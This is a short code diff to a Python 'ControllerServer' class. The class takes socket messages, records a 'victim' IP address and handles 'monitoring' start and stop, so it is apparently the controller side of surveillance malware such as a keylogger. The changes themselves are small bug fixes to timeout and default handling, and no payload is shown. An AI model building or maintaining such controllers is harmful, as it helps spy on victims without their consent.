@@ -97,7 +97,7 @@ class ControllerServer:
                     data = json.loads(data.decode())
                     data_str = data.get("message", "")
                     signal = data.get("signal", False)
-                    ip_victim = data.get("from_ip", "")
+                    ip_victim = data.get("from_ip", None)
                     if self.ip_victim is None or self.ip_victim != ip_victim:
                         self.ip_victim = ip_victim
                         self.send_command(message="Server_active")
@@ -117,7 +117,7 @@ class ControllerServer:
                         self.buffer = ""
                         print("Stopped. Enter 'start' to restart monitoring, 'exit' to quit... ->")
                 except socket.timeout as e:
-                    pass
+                    continue
                 except json.JSONDecodeError as e:
                     pass
                 except OSError as e:
